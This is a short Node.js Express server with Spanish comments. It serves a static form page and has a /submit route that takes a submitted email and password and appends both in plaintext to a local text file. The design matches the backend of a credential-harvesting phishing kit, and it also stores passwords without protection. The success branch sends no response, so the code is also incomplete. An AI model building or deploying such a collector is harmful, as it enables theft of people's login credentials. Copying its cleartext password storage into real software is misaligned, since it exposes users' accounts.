const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware para parsear datos del formulario
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

// Ruta principal para servir el formulario
app.use(express.static('public'));

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});


// Ruta para manejar el envío del formulario
app.post('/submit', (req, res) => {
    const { email, password } = req.body;

    // Formatear los datos
    const data = `Correo: ${email}\nContraseña: ${password}\n---\n`;

    // Ruta del archivo donde se guardarán los datos
    const filePath = path.join(__dirname, 'datos.txt');

    // Guardar los datos en el archivo
    fs.appendFile(filePath, data, (err) => {
        if (err) {
            console.error('Error al guardar los datos:', err);
            res.status(500).send('Error al guardar los datos');
        } else {
        }
    });
});

// Iniciar el servidor
app.listen(PORT, () => {
    console.log(`Servidor iniciado en http://localhost:${PORT}`);
});
